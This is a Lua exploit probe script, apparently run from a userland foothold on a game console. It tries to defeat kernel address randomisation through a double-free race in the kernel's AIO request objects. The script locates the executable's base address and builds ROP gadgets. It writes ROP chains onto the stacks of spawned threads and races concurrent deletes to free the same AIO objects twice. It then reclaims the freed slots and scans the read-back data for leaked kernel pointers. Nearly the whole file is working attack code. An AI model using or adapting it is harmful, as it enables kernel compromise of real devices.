-- CRASH_CLASS: HIGH
-- PROBE 70b: AIO self-reclaim KASLR — same-zone R-object overlap
--
-- 69l proved EVF=224B, namedobj=170B — WRONG zone for R (48B/64B).
-- Cross-subsystem spray is dead for KASLR.
--
-- NEW STRATEGY: same-subsystem reclaim.
--   1. Double-free AIO IDs (65l 2-thread race) -> R freed to zone 0x1ab59e0
--   2. R+0x00 = curthread+0x390 (kernel thread ptr, NOT zeroed before free)
--   3. R+0x08 = curthread+0x08 (kernel thread ptr, NOT zeroed before free)
--   4. Immediately submit NEW AIO requests via 669
--   5. New R allocations come from same zone -> reclaim freed R slot
--   6. New R+0x00 gets overwritten with CURRENT thread's kernel address
--      BUT: old R+0x00 value may briefly persist before overwrite
--   7. Read 666 status of the NEW request immediately
--      If R's layout puts the status field at an offset overlapping +0x00/+0x08,
--      the status dword may contain kernel pointer bytes
--
-- ALSO TEST: after double-free, do NOT submit new AIO.
--   Instead, read 666 on the FREED IDs. If the zone slot hasn't been
--   reclaimed, the kernel thread pointers are still in R+0x00/R+0x08.
--   666 reading a freed-but-unreclalimed ID might return stale data
--   from R+0x00 instead of the normal status dword.
--
-- The key question: does 666's status come from R, or from a separate table?
-- If from R, reading a freed R gives stale kernel pointers = KASLR defeat.

print("=== PROBE 70b: AIO SELF-RECLAIM KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

-- Get eboot base for gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(N(info))) end)
local eboot_lo = rd(info + 0x108)
local eboot_hi = rd(info + 0x10C)
if not eboot_lo or not eboot_hi then
    print("FATAL: cannot get eboot base")
    return
end
local eboot = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print("eboot=" .. fmt(eboot))

local stub = syscall.pipe.fn_addr
print("stub=" .. fmt(stub))

local pid = N(mk(20)())
print("pid=" .. pid)

-- Gadgets
local pop_rax_ret   = uint64(N(eboot) + 0x992)
local pop_rdi_ret   = uint64(N(eboot) + 0xC9DFE)
local pop_rsi_ret   = uint64(N(eboot) + 0xD77D)
local pop_rdx_ret   = uint64(N(eboot) + 0x3B02D7)
local pop_rcx_ret   = uint64(N(eboot) + 0xE64)
local bare_ret      = uint64(N(eboot) + 0x42)
local mov_rdi_rax   = uint64(N(eboot) + 0x92C67) -- mov [rdi],rax;ret
local jmp_self      = uint64(N(eboot) + 0x42)     -- ret as infinite ret-sled

-- /dev/zero fd
local sc_open = mk(5)
local zero_path = memory.alloc(16)
for c = 1, 9 do pcall(function() memory.write_byte(zero_path + c - 1, string.byte("/dev/zero", c)) end) end
pcall(function() memory.write_byte(zero_path + 9, 0) end)
local ok, zerofd = pcall(function() return sc_open(uint64(N(zero_path)), uint64(0)) end)
local zfd = -1
if ok then zfd = N(zerofd) end
print("zero_fd=" .. zfd)

-- Helper: submit N AIO requests, return id array
local function aio_submit(count, fd)
    local ids = {}
    local data_buf = memory.alloc(64)
    local result_buf = memory.alloc(8)
    local ids_buf = memory.alloc(8)
    for i = 1, count do
        local req = memory.alloc(0x28)
        wq(req + 0x00, uint64(0))
        wq(req + 0x08, uint64(16))
        wq(req + 0x10, uint64(N(data_buf)))
        wq(req + 0x18, uint64(N(result_buf)))
        wq(req + 0x20, uint64(fd))
        wd(ids_buf, 0); wd(ids_buf + 4, 0)
        local ok2, ret = pcall(function()
            return mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ids_buf)))
        end)
        if ok2 then
            local aid = rd(ids_buf)
            if aid and aid ~= 0 then ids[#ids + 1] = aid end
        end
    end
    return ids
end

-- Helper: poll IDs via 664
local function aio_poll(ids)
    local ids_buf = memory.alloc(8)
    local st_buf = memory.alloc(8)
    for _, aid in ipairs(ids) do
        wd(ids_buf, aid); wd(ids_buf + 4, 0)
        pcall(function() mk(664)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    end
end

-- Helper: delete IDs via 662
local function aio_delete(ids)
    local ids_buf = memory.alloc(8)
    local st_buf = memory.alloc(8)
    local results = {}
    for _, aid in ipairs(ids) do
        wd(ids_buf, aid); wd(ids_buf + 4, 0)
        wd(st_buf, 0xDEAD); wd(st_buf + 4, 0xDEAD)
        pcall(function() mk(662)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
        results[aid] = rd(st_buf)
    end
    return results
end

-- Helper: read 666 status with FULL qword readback
local function aio_666_full(aid)
    local ids_buf = memory.alloc(8)
    local out_buf = memory.alloc(64)
    for j = 0, 60, 4 do wd(out_buf + j, 0xCCCCCCCC) end
    wd(ids_buf, aid); wd(ids_buf + 4, 0)
    local ok2, ret = pcall(function()
        return mk(666)(uint64(N(ids_buf)), uint64(1), uint64(N(out_buf)))
    end)
    local d = {}
    for j = 0, 28, 4 do
        d[j] = rd(out_buf + j)
    end
    return ok2 and N(ret) or -999, d
end

-- Helper: launch child thread doing 662 delete
local function spawn_delete_child(gate, ids_arr, count)
    local stack_size = 0x200000
    local stack = memory.alloc(stack_size + 0x1000)
    local rsp_val = uint64(((N(stack) + stack_size) / 1) - ((N(stack) + stack_size) % 16) - 8)

    -- Build ROP chain on stack: sysarch(129, &fake_tcb) then 662(ids, count, states)
    local fake_tcb = memory.alloc(0x1000)
    wq(fake_tcb, uint64(N(fake_tcb))) -- self-pointer
    local tcb_ptr_buf = memory.alloc(8)
    wq(tcb_ptr_buf, uint64(N(fake_tcb)))

    local state_buf = memory.alloc(count * 4 + 8)
    local rsp = N(rsp_val)

    -- Wait on gate: read gate in loop until non-zero
    -- Actually just do the syscalls directly since gate timing is tricky
    -- sysarch(129, &fake_tcb)
    wq(uint64(rsp), pop_rax_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(165)) -- sysarch
    rsp = rsp + 8
    wq(uint64(rsp), pop_rdi_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(129)) -- SET_FSBASE
    rsp = rsp + 8
    wq(uint64(rsp), pop_rsi_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(N(tcb_ptr_buf)))
    rsp = rsp + 8
    wq(uint64(rsp), uint64(N(stub)))
    rsp = rsp + 8

    -- 662(ids, count, states)
    wq(uint64(rsp), pop_rax_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(662))
    rsp = rsp + 8
    wq(uint64(rsp), pop_rdi_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(N(ids_arr)))
    rsp = rsp + 8
    wq(uint64(rsp), pop_rsi_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(count))
    rsp = rsp + 8
    wq(uint64(rsp), pop_rdx_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(N(state_buf)))
    rsp = rsp + 8
    wq(uint64(rsp), uint64(N(stub)))
    rsp = rsp + 8

    -- Write gate marker then spin forever
    wq(uint64(rsp), pop_rax_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(0xD09E))
    rsp = rsp + 8
    wq(uint64(rsp), pop_rdi_ret)
    rsp = rsp + 8
    wq(uint64(rsp), uint64(N(gate)))
    rsp = rsp + 8
    wq(uint64(rsp), mov_rdi_rax)
    rsp = rsp + 8
    -- Park: infinite ret slide
    for p = 0, 200 do
        wq(uint64(rsp), bare_ret)
        rsp = rsp + 8
    end

    -- thr_new(455)
    local param = memory.alloc(0x38)
    wq(param + 0x00, rsp_val) -- BUT we need start_func, not stack entry
    -- Actually thr_new wants: start_func at +0, arg at +8, stack_base at +0x10, stack_size at +0x18
    -- We use pop_rax_ret as start_func (it will pop from the stack we set up)
    -- But thr_new sets RSP to top of provided stack, and jumps to start_func
    -- The ROP chain must be ON the provided stack
    -- RSP = (stack_base + stack_size) & ~0xF - 8
    -- The chain we wrote starts at rsp_val, so that's correct
    wq(param + 0x00, pop_rax_ret)    -- start_func
    wq(param + 0x08, uint64(0))      -- arg (unused, we ROP)
    wq(param + 0x10, uint64(N(stack))) -- stack_base
    wq(param + 0x18, uint64(stack_size)) -- stack_size

    -- child_tid at +0x30
    local child_tid = memory.alloc(8)
    wq(param + 0x30, uint64(N(child_tid)))

    local ok3, ret = pcall(function()
        return mk(455)(uint64(N(param)), uint64(0x38))
    end)
    return ok3 and N(ret) == 0, state_buf
end

print("")

-- [A] STALE READ: 666 on recently-freed IDs
-- If 666's status data comes from R, a freed R still has kernel pointers
print("[A] Stale read: 666 on freed AIO IDs")
local kptr_found = 0
for trial = 1, 10 do
    -- Submit, poll, delete
    local ids = aio_submit(16, zfd)
    aio_poll(ids)
    aio_delete(ids)

    -- Now read 666 on the FREED IDs
    local interesting = 0
    for _, aid in ipairs(ids) do
        local ret, data = aio_666_full(aid)
        local d0 = data[0] or 0
        local d4 = data[4] or 0xCCCCCCCC
        -- Check if d0 is NOT the expected "unknown id" sentinel (0x80020003)
        -- and NOT the sentinel (0xCCCCCCCC)
        if d0 ~= 0x80020003 and d0 ~= 0xCCCCCCCC and d0 ~= 0 then
            interesting = interesting + 1
            local h0, l0 = get_hi_lo(rq(ids_buf))
            print(string.format("  trial %d id=0x%X: 666 d0=0x%08X d4=0x%08X (UNUSUAL)", trial, aid, d0, d4))
        end
        -- Check for kernel pointer pattern in any dword
        for off = 0, 28, 4 do
            local v = data[off] or 0
            if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
                kptr_found = kptr_found + 1
                print(string.format("  *** KPTR trial %d id=0x%X +0x%02X: 0x%08X ***", trial, aid, off, v))
            end
        end
    end
    if trial % 5 == 0 then
        print(string.format("  trial %d: %d interesting, %d kptr", trial, interesting, kptr_found))
    end
end
print(string.format("  TOTAL kptr found: %d", kptr_found))
print("")

-- [B] RAPID RECLAIM: submit new AIO immediately after delete
-- Check if new IDs' 666 status contains stale kernel pointers
print("[B] Rapid self-reclaim: delete then immediately re-submit")
kptr_found = 0
for trial = 1, 10 do
    -- Submit batch A
    local ids_a = aio_submit(16, zfd)
    aio_poll(ids_a)

    -- Delete batch A (frees R objects to zone free list)
    aio_delete(ids_a)

    -- Immediately submit batch B (should reclaim freed R slots)
    local ids_b = aio_submit(16, zfd)

    -- Read 666 on batch B immediately
    for _, aid in ipairs(ids_b) do
        local ret, data = aio_666_full(aid)
        for off = 0, 28, 4 do
            local v = data[off] or 0
            if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
                kptr_found = kptr_found + 1
                print(string.format("  *** KPTR trial %d new_id=0x%X +0x%02X: 0x%08X ***", trial, aid, off, v))
            end
        end
    end

    -- Also check if batch B's status is unusual
    for _, aid in ipairs(ids_b) do
        local ret, data = aio_666_full(aid)
        local d0 = data[0] or 0
        if d0 ~= 3 and d0 ~= 0x10003 and d0 ~= 0x80020003 and d0 ~= 0xCCCCCCCC then
            print(string.format("  trial %d new_id=0x%X: unusual status 0x%08X", trial, aid, d0))
        end
    end

    -- Cleanup batch B
    aio_poll(ids_b)
    aio_delete(ids_b)
end
print(string.format("  TOTAL kptr found: %d", kptr_found))
print("")

-- [C] DOUBLE-FREE then self-reclaim (2-thread race)
-- Use the 67i2 socketpair-gate pattern for the double-delete
print("[C] Double-free -> self-reclaim -> stale read")
print("  Using socketpair-gated 2-thread concurrent 662")

local BATCH = 16
local doubles_total = 0
kptr_found = 0

for iter = 1, 10 do
    -- Submit + poll BATCH IDs
    local ids = aio_submit(BATCH, zfd)
    if #ids < BATCH then
        print(string.format("  iter %d: only %d IDs, skip", iter, #ids))
    else
        aio_poll(ids)

        -- Prepare shared ID array for both threads
        local shared_ids = memory.alloc(BATCH * 4 + 8)
        for j = 1, BATCH do wd(shared_ids + (j-1)*4, ids[j]) end

        -- Socketpair gate
        local sp = memory.alloc(8)
        wd(sp, 0); wd(sp + 4, 0)
        pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sp))) end)
        local gate_r = rd(sp)
        local gate_w = rd(sp + 4)

        -- Prepare state buffers
        local st_a = memory.alloc(BATCH * 4 + 8)
        local st_b = memory.alloc(BATCH * 4 + 8)

        -- Thread A: 662 delete
        local ok_a, _ = spawn_delete_child(memory.alloc(8), shared_ids, BATCH)

        -- Wait a tiny bit for thread A to start, then fire thread B
        for w = 1, 100 do local _ = rd(sp) end

        -- Thread B: 662 delete (same IDs)
        local ok_b, _ = spawn_delete_child(memory.alloc(8), shared_ids, BATCH)

        -- Wait for both threads to finish
        for w = 1, 500000 do local _ = rd(sp) end

        -- Check 662 results via 666
        -- After double-free, immediately submit new AIO
        local new_ids = aio_submit(BATCH * 2, zfd)
        print(string.format("  iter %d: %d new IDs after double-free", iter, #new_ids))

        -- Read 666 on new IDs
        for _, aid in ipairs(new_ids) do
            local ret, data = aio_666_full(aid)
            for off = 0, 28, 4 do
                local v = data[off] or 0
                if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
                    kptr_found = kptr_found + 1
                    print(string.format("  *** KPTR iter %d id=0x%X +0x%02X: 0x%08X ***", iter, aid, off, v))
                end
            end
        end

        -- Also read 666 on the ORIGINAL (freed) IDs
        for _, aid in ipairs(ids) do
            local ret, data = aio_666_full(aid)
            local d0 = data[0] or 0
            if d0 ~= 0x80020003 and d0 ~= 0xCCCCCCCC and d0 ~= 0 then
                print(string.format("  iter %d freed_id=0x%X: status 0x%08X (NOT unknown-id)", iter, aid, d0))
            end
            for off = 0, 28, 4 do
                local v = data[off] or 0
                if v >= 0xFFFF8000 and v ~= 0xFFFFFFFF and v ~= 0xCCCCCCCC then
                    kptr_found = kptr_found + 1
                    print(string.format("  *** KPTR iter %d freed=0x%X +0x%02X: 0x%08X ***", iter, aid, off, v))
                end
            end
        end

        -- Cleanup new IDs
        aio_poll(new_ids)
        aio_delete(new_ids)

        -- Close gate
        if gate_r then pcall(function() mk(6)(uint64(gate_r)) end) end
        if gate_w then pcall(function() mk(6)(uint64(gate_w)) end) end
    end
end
print(string.format("  TOTAL kptr: %d", kptr_found))
print("")

-- [D] 663 on freed IDs with all 3 wait types
print("[D] 663 wait-type sweep on freed IDs")
local ids_d = aio_submit(8, zfd)
aio_poll(ids_d)
aio_delete(ids_d)

for _, wt in ipairs({0, 1, 2}) do
    local out = memory.alloc(64)
    for j = 0, 60, 4 do wd(out + j, 0xCCCCCCCC) end
    local ids_buf_d = memory.alloc(8)
    wd(ids_buf_d, ids_d[1] or 0)
    local ok2, ret = pcall(function()
        return mk(663)(uint64(N(ids_buf_d)), uint64(1), uint64(N(out)), uint64(wt), uint64(0), uint64(0))
    end)
    local r = ok2 and N(ret) or -999
    local d0 = rd(out)
    local d4 = rd(out + 4)
    print(string.format("  wait_type=%d: ret=%d d0=0x%08X d4=0x%08X", wt, r, d0 or 0, d4 or 0))
end
print("")

print("alive=YES")
print("=== PROBE 70b COMPLETE ===")
